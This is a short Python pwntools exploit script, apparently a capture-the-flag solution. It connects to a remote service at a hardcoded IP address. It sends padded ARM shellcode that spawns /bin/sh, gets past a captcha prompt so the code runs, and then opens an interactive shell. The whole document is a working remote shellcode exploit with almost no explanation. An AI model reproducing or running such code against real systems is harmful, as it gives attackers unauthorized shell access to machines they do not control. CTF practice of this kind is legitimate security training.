#!/usr/bin/env python3

from pwn import *

#context.log_level = 'debug'

def run_code():
    sa(":>", str(1))
    p.recvuntil("Secret code : ")
    captcha = p.recvn(10)
    sla("Code? :>", captcha)

sa = lambda t, s: p.sendafter(t, s)
sla = lambda t, s: p.sendlineafter(t, s)

#p = remote("172.19.0.2", 1234)
p = remote("15.165.92.159", 1234)

sc = "\x00" * 0x30
sc += "\x01\x10\x8f\xe2\x11\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\xc1\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x41"
sc += "\x00" * 0x30

# It's work when i send only 0x00 * 0x40 so i added the padding then, work!

p.sendafter(":> ", sc)
run_code()

p.interactive()
